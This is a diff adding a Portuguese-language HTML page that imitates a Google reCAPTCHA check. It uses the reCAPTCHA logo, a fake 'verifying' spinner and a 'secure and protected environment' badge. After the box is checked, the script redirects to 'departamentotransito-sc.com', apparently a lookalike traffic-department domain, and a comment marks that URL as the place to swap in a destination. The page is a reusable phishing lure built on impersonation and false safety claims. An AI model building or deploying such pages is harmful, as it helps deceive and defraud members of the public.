@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Verificação de Segurança</title>
+
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+}
+
+body{
+  font-family: Arial, Helvetica, sans-serif;
+  background: linear-gradient(135deg,#e2e8f0,#f8fafc);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  height:100vh;
+}
+
+/* Container */
+.container{
+  width:100%;
+  max-width:380px;
+  text-align:center;
+  padding:15px;
+}
+
+/* Card */
+.card{
+  background:#ffffff;
+  border-radius:12px;
+  padding:25px;
+  box-shadow:0 10px 30px rgba(0,0,0,0.1);
+  animation:fadeIn 0.6s ease;
+}
+
+.title{
+  font-size:20px;
+  color:#1e293b;
+  margin-bottom:8px;
+  font-weight:600;
+}
+
+.subtitle{
+  font-size:13px;
+  color:#475569;
+  margin-bottom:20px;
+}
+
+/* Captcha */
+.captcha-box{
+  border:1px solid #d1d5db;
+  border-radius:8px;
+  padding:15px;
+  background:#f9fafb;
+}
+
+.captcha-row{
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+}
+
+/* Área checkbox */
+.check-area{
+  display:flex;
+  align-items:center;
+  gap:10px;
+  padding:10px;
+  border-radius:6px;
+  cursor:pointer;
+  transition:0.2s;
+}
+
+.check-area:hover{
+  background:#e2e8f0;
+}
+
+.check-area input{
+  width:22px;
+  height:22px;
+  cursor:pointer;
+}
+
+.check-text{
+  font-size:14px;
+  color:#1e293b;
+}
+
+/* Marca */
+.captcha-brand{
+  text-align:center;
+  font-size:10px;
+  color:#64748b;
+}
+
+.captcha-brand img{
+  width:34px;
+  display:block;
+  margin:0 auto 3px;
+}
+
+/* Loader */
+.loader{
+  width:22px;
+  height:22px;
+  border:3px solid #cbd5f5;
+  border-top:3px solid #2563eb;
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+  display:none;
+}
+
+@keyframes spin{
+  0%{transform:rotate(0);}
+  100%{transform:rotate(360deg);}
+}
+
+/* Rodapé */
+.footer{
+  margin-top:15px;
+  font-size:12px;
+  color:#64748b;
+}
+
+.footer span{
+  display:block;
+  margin-top:4px;
+  color:#94a3b8;
+}
+
+/* Selo segurança */
+.secure{
+  margin-top:15px;
+  font-size:12px;
+  color:#16a34a;
+  font-weight:600;
+}
+
+/* animação */
+@keyframes fadeIn{
+  from{
+    opacity:0;
+    transform:translateY(15px);
+  }
+  to{
+    opacity:1;
+    transform:translateY(0);
+  }
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="card">
+
+    <div class="title">Verificação de Segurança</div>
+    <div class="subtitle">
+      Confirme que você é humano para continuar
+    </div>
+
+    <div class="captcha-box">
+
+      <div class="captcha-row">
+
+        <label class="check-area">
+          <input type="checkbox" id="check">
+          <div id="loader" class="loader"></div>
+          <span class="check-text" id="text">Não sou um robô</span>
+        </label>
+
+        <div class="captcha-brand">
+          <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png">
+          reCAPTCHA
+          <br>
+          <span style="font-size:9px;">Privacidade - Termos</span>
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="secure">
+      ✔ Ambiente seguro e protegido
+    </div>
+
+    <div class="footer">
+      Após marcar a opção, a verificação será realizada automaticamente
+      <span>Isso ajuda a proteger o sistema contra acessos indevidos</span>
+    </div>
+
+  </div>
+
+</div>
+
+<script>
+const check = document.getElementById("check");
+const loader = document.getElementById("loader");
+const text = document.getElementById("text");
+
+check.addEventListener("change", () => {
+
+  if(check.checked){
+    loader.style.display = "inline-block";
+    text.innerText = "Verificando...";
+
+    setTimeout(() => {
+      loader.style.display = "none";
+      text.innerText = "Verificado ✔";
+
+      // 🔴 TROQUE AQUI
+      window.location.href = "https://departamentotransito-sc.com ";
+
+    }, 1800);
+  }
+
+});
+</script>
+
+</body>
+</html>
